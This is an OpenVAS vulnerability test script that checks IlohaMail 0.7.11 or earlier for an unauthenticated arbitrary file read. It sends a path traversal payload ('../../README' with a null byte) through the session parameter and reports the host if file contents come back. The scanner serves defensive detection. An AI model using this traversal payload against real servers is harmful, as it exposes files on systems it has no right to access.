##############################################################################
# OpenVAS Vulnerability Test
# $Id: ilohamail_arbitrary_file_access_via_session.nasl 13238 2019-01-23 11:14:26Z cfischer $
#
# IlohaMail Arbitrary File Access via Session Variable Vulnerability
#
# Authors:
# George A. Theall, <theall@tifaware.com>.
#
# Copyright:
# Copyright (C) 2004 George A. Theall
#
# This program is free software; you can redistribute it and/or modify
# it under the terms of the GNU General Public License version 2,
# as published by the Free Software Foundation
#
# This program is distributed in the hope that it will be useful,
# but WITHOUT ANY WARRANTY; without even the implied warranty of
# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
# GNU General Public License for more details.
#
# You should have received a copy of the GNU General Public License
# along with this program; if not, write to the Free Software
# Foundation, Inc., 51 Franklin St, Fifth Floor, Boston, MA 02110-1301 USA.
##############################################################################

CPE = "cpe:/a:ilohamail:ilohamail";

if(description)
{
  script_oid("1.3.6.1.4.1.25623.1.0.14631");
  script_version("$Revision: 13238 $");
  script_tag(name:"last_modification", value:"$Date: 2019-01-23 12:14:26 +0100 (Wed, 23 Jan 2019) $");
  script_tag(name:"creation_date", value:"2005-11-03 14:08:04 +0100 (Thu, 03 Nov 2005)");
  script_tag(name:"cvss_base", value:"5.0");
  script_tag(name:"cvss_base_vector", value:"AV:N/AC:L/Au:N/C:N/I:N/A:P");
  script_name("IlohaMail Arbitrary File Access via Session Variable Vulnerability");
  script_category(ACT_ATTACK);
  script_copyright("This script is Copyright (C) 2004 George A. Theall");
  script_family("Remote file access");
  script_dependencies("ilohamail_detect.nasl");
  script_mandatory_keys("ilohamail/detected");

  script_tag(name:"solution", value:"Upgrade to IlohaMail version 0.7.12 or later.");

  script_tag(name:"summary", value:"The target is running at least one instance of IlohaMail version
  0.7.11 or earlier. Such versions contain a flaw in the processing of the session variable that allows
  an unauthenticated attacker to retrieve arbitrary files available to the web user, provided the
  filesystem backend is in use.");

  script_tag(name:"solution_type", value:"VendorFix");
  script_tag(name:"qod_type", value:"remote_vul");

  exit(0);
}

include("http_func.inc");
include("http_keepalive.inc");
include("host_details.inc");

if( ! port = get_app_port( cpe:CPE ) ) exit( 0 );
if( ! dir  = get_app_location( cpe:CPE, port:port ) ) exit( 0 );
if( dir == "/" ) dir = "";

# Specify the file to grab from target, relative to IlohaMail/sessions
# directory.
# nb: ../../README exists in each version I've seen.
file = "../../README";

# nb: the hole exists because session_auth.FS.inc trusts
#     the session variable when calling include_once() to
#     validate the session.
url = dir + "/index.php?session=" + file + "%00";
req = http_get( item:url, port:port );
res = http_keepalive_send_recv( port:port, data:req );
if( isnull( res ) ) exit( 0 );

# nb: if successful, file contents will appear after the closing
#     HEAD tag; otherwise, there will be a message about a session
#     timeout. Regardless, we only need check the first 5 lines or so.
lines = split( res );
nlines = max_index( lines ) - 1;
for( i = 0; i <= nlines; i++ ) {
  if( lines[i] =~ "</HEAD>" ) {
    next = lines[i+1];
    if( next !~ "Session timeout" ) {
      report = report_vuln_url( port:port, url:url );
      security_message( port:port, data:report );
      exit( 0 );
    }
    break; # nb: no need to check any further.
  }
}

exit( 99 );